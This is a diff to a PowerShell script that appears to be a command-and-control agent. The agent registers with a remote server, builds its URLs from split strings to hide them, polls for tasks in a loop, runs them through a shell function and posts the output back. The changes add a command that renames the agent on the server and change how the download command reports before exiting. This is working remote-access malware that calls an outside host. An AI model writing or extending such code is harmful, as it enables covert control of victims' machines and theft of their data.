@@ -13,6 +13,7 @@ $data  = @{
 $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
 
 $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
+$renamel = ("http" + ':' + "//$ip" + ':' + "$port/rename/$name")
 $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
 
 function shell($fname, $arg){
@@ -59,10 +60,23 @@ for (;;){
             $data = @{result = "$res"}
                         
             Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+        } elseif ($command -eq "rename") {
+            $url = ("http" + ':' + "//$ip" + ':' + "$port/rename/$name")
+
+            $name = $task[1]
+
+            $data = @{name = "$name"}
+            Invoke-WebRequest -UseBasicParsing -Uri $url -Body $data -Method 'POST'
+
+            $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
+            $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
+
         } elseif ($command -eq "persist"){
-	        exit # TODO: persistence
+	        # TODO: persistence
+	        exit
         } elseif ($command -eq "download"){
-	        exit # TODO: download
+	        Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body  @{result = "Terminating..."} -Method 'POST'
+	        exit
         } elseif ($command -eq "terminate"){
 	        exit
         }
